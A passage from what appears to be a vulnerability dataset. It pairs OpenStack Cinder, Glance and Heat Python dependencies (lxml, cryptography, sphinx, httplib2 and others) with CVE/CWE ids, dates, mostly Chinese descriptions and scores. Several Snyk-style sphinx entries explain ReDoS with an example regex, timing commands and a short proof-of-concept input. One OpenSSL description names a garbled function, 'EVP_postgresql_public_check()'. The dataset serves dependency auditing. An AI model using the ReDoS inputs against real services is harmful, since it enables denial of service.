lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
openstack_cinder,lxml,>=4.5.2,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
openstack_cinder,lxml,>=4.5.2,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
openstack_cinder,lxml,>=4.5.2,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
openstack_cinder,paramiko,>=2.7.2,True,CVE-2022-24302,CWE-362,2022-03-17,"Paramiko是一个 SSHv2 协议的纯 Python 实现。提供客户端和服务器功能。
Paramiko 2.10.1之前版本 存在安全漏洞，该漏洞源于write_private_key_file函数中的竞争条件（creation and chmod之间）允许未经授权的信息泄露。",2,0
openstack_cinder,requests,>=2.25.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_cinder,requests,>=2.25.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_cinder,requests,>=2.25.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_cinder,WebOb,>=1.8.6,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_cinder,cryptography,>=3.1,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_cinder,cryptography,>=3.1,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_cinder,cryptography,>=3.1,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_cinder,cryptography,>=3.1,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_cinder,cryptography,>=3.1,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_cinder,cryptography,>=3.1,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_cinder,cryptography,>=3.1,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-49083,CWE-476,2023-11-29,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python cryptography 3.1到 41.0.6版本存在代码问题漏洞，该漏洞源于加载 PKCS7 证书时可能会导致空指针取消引用和段错误。",3,0
openstack_cinder,cryptography,>=3.1,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_cinder,cryptography,>=3.1,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_cinder,cryptography,>=3.1,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_cinder,cryptography,>=3.1,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_cinder,zstd,>=1.4.5.1,True,CVE-2022-4899,CWE-400,2023-03-31,"Facebook Zstandard是美国Facebook公司的一种开源的无损数据压缩算法。
Zstandard存在安全漏洞，该漏洞源于util.c 中存在缓冲区溢出。",2,2
openstack_glance,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_glance,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_glance,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_glance,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_glance,eventlet,>=0.33.3,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
openstack_glance,WebOb,>=1.8.1,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_glance,httplib2,>=0.9.1,True,CVE-2021-21240,CWE-400,2021-02-08,"httplib2是一款HTTP客户端库。
httplib2 0.19.0之前的版本中存在安全漏洞，该漏洞源于在 www-authenticate 报头中响应长串 xa0 字符可能会导致httpplib2客户端访问该服务器时拒绝服务。",2,2
openstack_glance,httplib2,>=0.9.1,True,,CWE-93,2020-06-01,"## Overview
[httplib2](https://github.com/httplib2/httplib2) is a small HTTP client library for Python.

Affected versions of this package are vulnerable to CRLF Injection. It allows `%xx` quote of space, CR, LF characters in the URI.
## Remediation
Upgrade `httplib2` to version 0.18.0 or higher.
## References
- [GitHub Commit](https://github.com/httplib2/httplib2/commit/a1457cc31f3206cf691d11d2bf34e98865873e9e)
",2,2
openstack_glance,httplib2,>=0.9.1,True,CVE-2020-11078,CWE-93 CWE-74,2020-05-20,"httplib2是一款HTTP客户端库。
httplib2 0.18.0之前版本中存在注入漏洞。攻击者可通过控制的uri（httplib2.Http.request()）未转义部分利用该漏洞更改请求标头和正文，并将其他隐藏请求发送到同一服务器。",3,0
openstack_glance,httplib2,>=0.9.1,True,CVE-2013-2037,CWE-20,2012-02-27,httplib2 0.7.2及之前的版本和0.8及之前的版本中存在安全漏洞，该漏洞源于程序在完成初始化连接后，没有验证主题的Common Name或X.509证书的中subjectAltname字段的域名是否与服务器主机名匹配。攻击者可借助任意有效的证书利用该漏洞实施中间人攻击，欺骗SSL服务器。,3,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_glance,cryptography,>=2.6.1,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_glance,cryptography,>=2.6.1,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_glance,cryptography,>=2.6.1,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_glance,cryptography,>=2.6.1,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_glance,cryptography,>=2.6.1,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_heat,sphinx,>=2.0.0,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_heat,sphinx,>=2.0.0,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_heat,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
